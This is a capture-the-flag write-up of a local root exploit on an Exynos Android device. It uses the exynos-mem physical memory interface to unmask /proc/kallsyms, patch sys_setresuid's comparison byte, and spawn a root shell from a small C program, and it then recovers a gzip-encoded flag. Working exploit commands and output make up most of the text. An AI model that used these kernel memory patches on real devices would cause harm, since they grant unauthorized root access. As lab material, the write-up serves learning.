[we'll use this for reference](https://github.com/FSecureLABS/mercury-modules/blob/master/metall0id/root/exynosmem/exynos-abuse/jni/exynos-abuse.c)


first we need to make /proc/kallsyms always print the addresses of the symbols, for that we'll first find the format string `%pK %c %s` in the physical memory. For that i used the following bash script:
```sh
for i in `seq 0x100000 0x100000 0xffffffff`
do
    printf "ADDRESS: %x\n" $i
    ./exynos-mem $i `printf "%d" 0x100000` 0| hexdump -C | grep "%pK"
done
```
this outputs a lot of useless stuff but also this

```
ADDRESS: 60400000
00009250  73 74 00 00 3c 25 70 4b  3e 00 00 00 54 69 63 6b  |st..<%pK>...Tick|
00009830  72 65 0a 00 30 78 25 70  4b 0a 00 00 4c 69 76 65  |re..0x%pK...Live|
00009e70  6e 74 00 00 25 70 4b 20  25 63 20 25 73 09 5b 25  |nt..%pK %c %s.[%|
00009e80  73 5d 0a 00 25 70 4b 20  25 63 20 25 73 0a 00 00  |s]..%pK %c %s...| <--- well use this and change it to print always
0000d800  4b 2d 30 78 25 70 4b 20  25 37 6c 64 20 76 6d 5f  |K-0x%pK %7ld vm_|
0000d820  4b 2d 30 78 25 70 4b 20  25 37 6c 64 00 00 00 00  |K-0x%pK %7ld....|
0003ae20  25 70 4b 20 25 2d 33 64  20 25 2d 36 75 20 25 30  |%pK %-3d %-6u %0|
0003ae30  38 78 20 25 2d 38 64 20  25 2d 38 64 20 25 70 4b  |8x %-8d %-8d %pK|
0003b910  25 6c 75 20 25 64 20 25  70 4b 20 25 6c 75 20 25  |%lu %d %pK %lu %|
0003b970  25 75 20 25 64 20 25 70  4b 25 6e 00 25 34 64 3a  |%u %d %pK%n.%4d:|
0003b9c0  64 20 25 70 4b 25 6e 00  25 2a 73 0a 00 00 00 00  |d %pK%n.%*s.....|
0003bc80  25 64 20 25 70 4b 20 25  64 0a 00 00 20 20 73 6c  |%d %pK %d...  sl|
0003bd40  25 6c 75 20 25 64 20 25  70 4b 20 25 64 25 6e 00  |%lu %d %pK %d%n.|
0003e170  61 74 68 0a 00 00 00 00  25 70 4b 3a 20 25 30 38  |ath.....%pK: %08|
0003e350  20 20 49 6e 6f 64 65 0a  00 00 00 00 25 70 4b 20  |  Inode.....%pK |
```

from here we can understand that our string is located at `0x60409e84`. We want to change the `%pK` in the string to just `%p` os i'll just replace the K with a space using the following command:
```sh
printf " " | ./exynos-mem 1614847622 1 1
```

now can get the address of sys_setresuid so we can patch it to always give root even if we are not allowed to.

first get the address

```sh
/ $ cat /proc/kallsyms | grep sys_setresuid
8002f3bc  T sys_setresuid
8006087c  T sys_setresuid16
```
Great it worked, sys_setresuid is at `0x8002f3bc`. But there's a catch, this address is virtual, and the program only lets us access physical memory.
After a bunch of googling i understood that kernel memory is directly mapped to physical one, in our case the virtual kernel memory is at `0x80000000` and the physical one is at `0x60000000` so the phyical address of setresuid is:
```
0x8002f3bc - 0x80000000 + 0x60000000 = 0x6002f3bc 
```

lets take a look at the memory at this address:
```sh
./exynos-mem `printf "%d" 0x6002f3bc` 200 0  | hexdump -e  '16/1 "%02x " "\n"'
f0 41 2d e9 00 50 a0 e1 01 60 a0 e1 02 80 a0 e1
1e 40 00 eb 00 40 50 e2 47 00 00 0a 0d 20 a0 e1
7f 3d c2 e3 3f 30 c3 e3 07 00 a0 e3 0c 30 93 e5
f4 71 93 e5 29 e2 ff eb 00 00 50 e3 25 00 00 1a
01 00 75 e3 08 00 00 0a 04 30 97 e5 03 00 55 e1
05 00 00 0a 14 30 97 e5 03 00 55 e1 02 00 00 0a
0c 30 97 e5 03 00 55 e1 15 00 00 1a 01 00 76 e3
08 00 00 0a 04 30 97 e5 03 00 56 e1 05 00 00 0a
14 30 97 e5 03 00 56 e1 02 00 00 0a 0c 30 97 e5
03 00 56 e1 0a 00 00 1a 01 00 78 e3 0d 00 00 0a
04 30 97 e5 03 00 58 e1 0a 00 00 0a 14 30 97 e5
03 00 58 e1 07 00 00 0a 0c 30 97 e5 03 00 58 e1
processed 200 bytes
04 00 00 0a 00 50 e0 e3
``` 
now yoink the hex into a disassmbler such as [this](https://shell-storm.org/online/Online-Assembler-and-Disassembler/)
we can see this does look like sane code and it seems like we got the right address, now according to the exploit i included in the beginning it should be enough to change the  `cmp  r0, #0` to `cmp  r0, #1`. so let's do that, according to the disassembly the address of `cmp  r0, #0` is at 0x38 so we just add that to our address, and find that this instruction is at `1610806260`. Because the system is little endian, we can change 1 byte at this address to '\x01' to change the instruction to `cmp  r0, #1`. Lets do that:
```sh
printf "\x01" | ./exynos-mem 1610806260 1 1
```
now just setresuid and get shell using a c program:

```c
#include <unistd.h>

int main(int argc, char **argv, char **env)
{
    char *path[2] = {"/bin/sh", NULL};
    setresuid(0, 0, 0);
    execve(path[0], path, env);
}
```

its not over yet! now we have to find the flag! 
in /root we see a weird file called f, but its a binary file so i decide to move it to my own machine to understand what is it, i encode it using base64
```
/ # base64 /root/f
H4sIABuCgVkAA+3OsQ6CQBCE4at9Ch5hEZTa2lL7zRkQSPDO3B0FPr1oa6IVMcb/yyZTzBZzHmxr
FiazUuSZ8poi1cbkheSlbKVaF0ZyKarSZLL0sIcxJhuyzATv07u/T/2POnZ91PlONja1eqehsYPG
5MOkqvux9lGT14O9xNG1al2tu6G5djfbu9W3xwMAAAAAAAAAAAAAAADAH7sD9KsoEwAoAAA=
```

and on my own machine 
```sh
echo H4sIABuCgVkAA+3OsQ6CQBCE4at9Ch5hEZTa2lL7zRkQSPDO3B0FPr1oa6IVMcb/yyZTzBZzHmxrFiazUuSZ8poi1cbkheSlbKVaF0ZyKarSZLL0sIcxJhuyzATv07u/T/2POnZ91PlONja1eqehsYPG5MOkqvux9lGT14O9xNG1al2tu6G5djfbu9W3xwMAAAAAAAAAAAAAAADAH7sD9KsoEwAoAAA= | base64 -d > f
```

use `file` to find what the file type,

```
$ file f                                       
f: gzip compressed data, last modified: Wed Aug  2 07:41:15 2017, from Unix, original size modulo 2^32 10240
```

its gzip, so rename it and uncompress it using gunzip

```sh
mv f f.gz
gunzip f.gz
```

we get a file `f` and in it we can find the flag!